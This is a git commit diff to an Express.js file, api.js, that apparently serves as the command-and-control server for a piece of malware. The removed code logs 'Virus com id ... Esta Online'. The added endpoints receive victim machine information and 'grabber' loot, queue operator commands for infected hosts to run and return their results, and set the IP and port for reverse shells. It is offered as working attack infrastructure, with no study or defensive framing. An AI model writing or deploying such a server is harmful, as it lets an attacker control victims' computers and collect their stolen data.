3a3071c83a59be07992118ce38044058d6262a2e
Rafark123 <zumbidoalasca@gmail.com>
2022-04-20 16:12:15 -0300

    a

--- api.js
+++ api.js
@@ -1,30 +1,66 @@
-const express = require('express');
-const app = express();
-let a = 'nada'
-let b
-var port = process.env.PORT || 3000
+const express = require(`express`)
+const app = express()
+const port = 8080 || process.env.PORT
+
 app.use(express.json({limit: "50mb"}));
 app.use(express.urlencoded({limit: "50mb", extended: true, parameterLimit:50000}));
 
-app.post('/a', (req, res) => {
-    console.log('Virus com id: ' + req.headers.id + '   Esta Online');
-res.send(a)
-a = 'nada'
-b = req.body
-console.log(req.body)
-});
+var ip = {ip:'',porta:0,estado:'off'};
+var infopc
+var infopG
+var comando
+var resultado
+//passainfo
+app.post(`/passainfo`, (req, res) => {
+    res.send(`OK`)
+    infopc = req.body
+})
+app.post(`/passagrabber`, (req, res) => {
+    res.send(`OK`)
+    infopG = req.body
+})
+app.post(`/executa`, (req, res) => {
+    res.send(comando)
+    comando = ''
+resultado = req.body.js
+})
 
-app.post('/b', (req, res) => {
-a = req.body.text
-if(b != undefined){
-    res.send(b)
+app.post(`/executaA`, async(req, res) => {
+    comando = req.body.cmd
+res.send(resultado)
+
+})
+
+app.post(`/reverseshell`, async(req, res) => {
+if(ip.estado == 'off'){
+    res.send('nada')
+}else{
+    res.send(ip)
 }
-});
+console.log(ip)
 
-app.get('/', (req, res) => {
+})
+app.post(`/reverseshellC`, async(req, res) => {
 
-res.sendFile(require('path').join(__dirname, 'index.html'));
+    ip.ip = req.body.ip
+    ip.porta = req.body.porta
+    ip.estado = req.body.estado
+    res.send(`OK`+ip)
 
-});
+    })
 
-app.listen(port);
+
+app.post(`/infoA`, async(req, res) => {
+res.send(infopc)
+
+})
+
+app.post(`/graberA`, async(req, res) => {
+res.send(infopG)
+
+})
+//executaA
+//reverseshellC
+//infoA
+//graberA
+app.listen(port, () => console.log(`Example app listening on port ${port}!`))
